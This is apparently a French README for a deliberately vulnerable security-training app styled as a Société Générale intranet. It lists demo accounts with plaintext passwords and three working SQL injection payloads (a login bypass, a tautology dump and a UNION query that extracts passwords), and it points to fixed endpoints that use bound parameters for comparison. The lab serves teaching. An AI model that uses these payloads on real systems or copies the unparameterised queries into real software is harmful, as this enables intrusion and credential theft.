# SG Intranet — Application Société Générale

Application interne aux couleurs Société Générale avec :
- Page de connexion sécurisée
- Annuaire de 7 collaborateurs
- Galerie photo des locaux (12 photos)
- Failles SQLi intégrées pour un lab de sécurité

**Stack** : React + Vite · FastAPI · PostgreSQL

---

## Démarrage

```bash
docker compose down -v  # nettoyer si déjà lancé
docker compose up --build
```

- **Frontend** : http://localhost:5173
- **Backend / Swagger** : http://localhost:8000/docs

---

## Comptes de connexion (7 utilisateurs)

| Username | Password | Rôle |
|----------|----------|------|
| `alice` | `alice2026` | Manager |
| `ali` | `ali2026` | DevOps Engineer |
| `lucas` | `lucas2026` | Alternant DevSecOps |
| `sophie` | `sophie2026` | Architecte Cloud |
| `marc` | `marc2026` | Lead Developer |
| `emma` | `emma2026` | Product Owner |
| `thomas` | `thomas2026` | Site Reliability Engineer |

---

## Lab SQLi — Failles intégrées

### Faille 1 : Bypass d'authentification

**Endpoint** : `POST /api/auth/login`

Payload dans la page de connexion :
- Username : `alice' --`
- Password : `n'importe quoi`

→ Connexion réussie sans mot de passe valide.

### Faille 2 : Injection dans recherche employés

**Endpoint** : `GET /api/users/search?q=`

Payload :
```
GET /api/users/search?q=' OR '1'='1
```

→ Dump de tous les utilisateurs.

### Faille 3 : Injection UNION sur lookup par nom

**Endpoint** : `GET /api/users/by-name/{name}`

Payload :
```
GET /api/users/by-name/x' UNION SELECT username,password,full_name,role,department,entreprise,email,avatar_url,bio FROM users--
```

→ Dump des **mots de passe en clair** de tous les utilisateurs.

---

## Endpoints corrigés (comparaison)

- `POST /api/auth/login-secure` — paramètres liés
- `GET /api/users/search-secure` — paramètres liés

---

> ⚠ **Note pour l'exposé** : les photos sont des images Unsplash libres de droit utilisées comme placeholders. Pour un déploiement réel, remplacer par les vraies photos SG avec autorisation.
